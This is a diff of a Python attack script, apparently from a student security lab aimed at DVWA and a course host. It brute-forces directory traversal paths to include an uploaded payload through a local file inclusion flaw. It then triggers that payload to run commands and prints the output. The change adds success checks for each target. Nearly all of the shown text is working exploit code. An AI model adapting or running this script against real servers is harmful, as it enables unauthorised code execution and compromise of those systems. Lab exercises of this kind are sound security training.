@@ -39,13 +39,17 @@ def brute_force_lfi(lfi_url_base, payload_filename, session, COOKIE):
                 test_url = (
                     f"{lfi_url_base}{traversal}{payload_relative}{payload_filename}"
                 )
-                print(f"[*] Trying LFI URL: {test_url}")
+                # print(f"[*] Trying LFI URL: {test_url}")
                 try:
                     response = session.get(test_url, cookies=COOKIE)
-                    # Problem: only works for website
-                    if "File not found." not in response.text:
-                        print(f"[+] Successfully included payload: {test_url}")
-                        return test_url
+                    if "http://ict2214p1b2.mooo.com/" in lfi_url_base:
+                        if "File not found." not in response.text:
+                            print(f"[+] Successfully included payload: {test_url}")
+                            return test_url
+                    elif "http://127.0.0.1/DVWA/" in lfi_url_base:
+                        if not response.text.startswith("<!DOCTYPE html>"):
+                            print(f"[+] Successfully included payload: {test_url}")
+                            return test_url
                 except Exception as e:
                     print(f"[-] Error testing {test_url}: {str(e)}")
 
@@ -71,7 +75,7 @@ def trigger_payload_via_lfi(url, COOKIE):
         response = requests.get(full_url, cookies=COOKIE)
         if response.status_code == 200:
             print("[+] Command results:")
-            # print(response.text)
+            print(response.text)
             return response.text
         else:
             print(f"[-] Execution failed (HTTP {response.status_code})")
